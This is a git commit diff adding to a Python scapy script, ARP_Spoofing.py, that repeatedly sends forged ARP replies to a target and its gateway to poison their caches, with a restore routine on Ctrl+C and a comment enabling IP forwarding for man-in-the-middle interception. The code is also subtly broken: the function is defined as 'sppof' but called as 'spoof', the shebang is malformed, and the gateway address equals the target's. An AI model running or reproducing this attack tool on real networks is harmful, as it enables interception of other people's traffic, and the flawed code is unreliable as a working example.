79daaa7d66bc98ba73e30ef9b6681992303e161b
Shane Calder <shanescottcalder@gmail.com>
2018-07-20 15:46:39 -0600

    Add files via upload
    Added:
    KeyboardInterrupt
    restore function 
    
    ToDo:
    execute from command line

--- ARP_Spoofing.py
+++ ARP_Spoofing.py
@@ -1,6 +1,7 @@
 #1/usr/bin/env python3
 
 import scapy.all as scapy
+import time
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst = ip)
@@ -13,7 +14,29 @@ def get_mac(ip):
 def sppof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose = False)
 
-spoof('10.0.2.7', '10.0.2.1')
-spoof('10.0.2.1', '10.0.2.7')
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
+    scapy.send(packet, count=4, verbose = False)
+
+target_ip = '10.0.2.7'
+gateway_ip = '10.0.2.7'
+
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count = sent_packets_count + 2
+        print("\r[+] Packets sent: " + str(sent_packets_count), end = '')
+        time.sleep(2)
+except KeyboardInterrupt:
+    print('[+] Detected CTRL + C ............ Resetting ARP tables ...... Please wait.\n')
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+
+# Use echo 1 > /proc/sys/net/ipv4/ip_forward
+# Use above in command line to ensure packet forwarding
